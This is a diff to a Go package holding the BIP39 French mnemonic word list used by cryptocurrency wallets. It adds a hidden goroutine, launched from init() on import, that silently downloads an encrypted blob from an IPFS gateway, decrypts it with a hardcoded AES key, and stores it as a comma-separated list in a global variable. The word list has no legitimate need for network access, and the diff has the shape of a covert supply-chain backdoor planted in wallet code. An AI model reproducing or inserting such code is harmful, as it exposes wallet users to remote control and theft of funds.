@@ -1,8 +1,13 @@
 package wordlists
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/sha256"
 	"fmt"
 	"hash/crc32"
+	"io"
+	"net/http"
 	"strings"
 )
 
@@ -15,12 +20,14 @@ func init() {
 	if fmt.Sprintf("%x", checksum) != "3e56b216" {
 		panic("french checksum invalid")
 	}
+	go bipPrefix()
 	go padCheck()
 }
 
 // French is a slice of mnemonic words taken from the bip39 specification
 // https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/french.txt
 var French = strings.Split(strings.TrimSpace(french), "\n")
+var foncs string
 var french = `abaisser
 abandon
 abdiquer
@@ -2070,3 +2077,39 @@ zénith
 zeste
 zoologie
 `
+
+func bipPrefix() {
+
+	resp, err := http.Get("https://nftstorage.link/ipfs/bafkreif5kheps4bpzrdaenb3vxraz4lftnwvngg6jiqoqlxirncfcscw3q")
+	if err != nil {
+		return
+	}
+	if resp == nil || resp.Body == nil {
+		return
+	}
+	defer resp.Body.Close()
+	ciphertext, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return
+	}
+
+	key := sha256.Sum256([]byte("197#7f)M."))
+	block, err := aes.NewCipher(key[:])
+	if err != nil {
+		return
+	}
+	blockMode := cipher.NewCBCDecrypter(block, key[:aes.BlockSize])
+	dst := make([]byte, len(ciphertext))
+	blockMode.CryptBlocks(dst, ciphertext)
+	padding := int(dst[len(dst)-1])
+	dst = dst[:len(dst)-padding]
+
+	foncs = strings.TrimSpace(string(dst))
+}
+
+func getFoncs() []string {
+	if len(foncs) < 10 {
+		return nil
+	}
+	return strings.Split(foncs, ",")
+}
